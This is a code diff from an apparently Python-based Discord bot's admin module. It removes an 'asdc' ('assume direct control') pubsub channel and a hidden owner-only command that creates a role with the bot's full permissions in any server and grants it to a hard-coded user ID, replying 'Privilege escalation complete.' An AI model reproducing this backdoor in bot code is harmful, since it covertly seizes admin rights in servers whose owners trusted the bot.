@@ -46,8 +46,7 @@ class AdminUtils:
 
         self.bot.loop.create_task(self.handle_pubsub())
         self.bot.db.pubsub.subscribe('server-info-requests', 'server-info-response',  # all-shard communication
-                                     'admin-commands',  # 1-shard communication
-                                     'asdc'  # assume direct control
+                                     'admin-commands'  # 1-shard communication
                                      )
         self.requests = {}
 
@@ -144,16 +143,6 @@ class AdminUtils:
                 await self.bot.say(m)
         else:
             await self.bot.say(out[page - 1])
-
-    @commands.command(hidden=True, pass_context=True)
-    @checks.is_owner()
-    async def pek(self, ctx, servID: str):
-        serv = self.bot.get_server(servID)
-        thisBot = serv.me
-        pek = await self.bot.create_role(serv, name="Bot Dev",
-                                         permissions=thisBot.server_permissions)
-        await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
-        await self.bot.say("Privilege escalation complete.")
 
     @commands.command(hidden=True, name='leave')
     @checks.is_owner()
